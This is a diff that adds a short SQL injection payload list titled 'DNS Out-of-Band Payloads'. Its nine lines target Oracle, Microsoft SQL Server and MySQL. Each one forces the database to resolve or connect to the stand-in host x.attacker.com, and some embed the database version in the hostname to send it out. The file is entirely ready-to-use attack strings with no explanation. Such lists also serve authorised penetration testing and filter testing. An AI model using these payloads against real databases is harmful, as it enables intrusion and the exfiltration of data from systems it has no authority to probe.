@@ -1,0 +1,10 @@
+# DNS Out-of-Band Payloads
+' AND (SELECT UTL_INADDR.get_host_name('x.attacker.com'))--
+' OR (SELECT UTL_INADDR.get_host_name('x.attacker.com'))--
+1' AND (SELECT UTL_INADDR.get_host_name('x.attacker.com'))--
+' exec master..xp_dirtree '\\x.attacker.com\share'--
+1' exec master..xp_dirtree '\\x.attacker.com\share'--
+'; exec master..xp_dirtree '\\x.attacker.com\share'--
+' AND LOAD_FILE(CONCAT('\\\\', (SELECT version()), '.x.attacker.com\\test'))--
+1' AND LOAD_FILE(CONCAT('\\\\', (SELECT version()), '.x.attacker.com\\test'))--
+' OR LOAD_FILE(CONCAT('\\\\', (SELECT version()), '.x.attacker.com\\test'))--
